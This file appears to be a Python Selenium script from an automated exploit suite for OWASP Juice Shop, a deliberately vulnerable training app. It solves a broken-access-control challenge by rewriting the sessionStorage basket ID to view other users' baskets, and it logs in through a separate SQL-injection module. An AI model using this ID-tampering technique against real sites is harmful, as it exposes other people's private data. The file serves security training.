# This file will allow us to exploit the view basket functionality of the OWASP Juice Shop
# by modifying a session value in order to view another user's basket.

# Completes the achievement "Broken Access Control - View Basket"

# Import libraries
from selenium.webdriver.common.by import By
import time
from Exploits import SQLi

# This will exploit the session-stored basketID, allowing us to see other user's baskets.
def test_bac(driver, base_url, sleep):
    try:
        if (len(driver.find_elements(By.XPATH, "//mat-icon[contains(text(), 'shopping_cart')]")) < 1):
            SQLi.test_sqli(driver, base_url, sleep)
    
        driver.get(f"{base_url}/#/basket")
        time.sleep(2)

        before_items = len(driver.find_elements(By.TAG_NAME, "mat-row"))

        success = False
        for i in range(1,6):
            driver.execute_script(f"sessionStorage.setItem('bid', '{i}');")
            driver.refresh()
            time.sleep(2)
            new_items = len(driver.find_elements(By.TAG_NAME, "mat-row"))
            if new_items != before_items:
                success = True
        return success
    except Exception as e:
        print(f"An exception occured: {e}")
        return False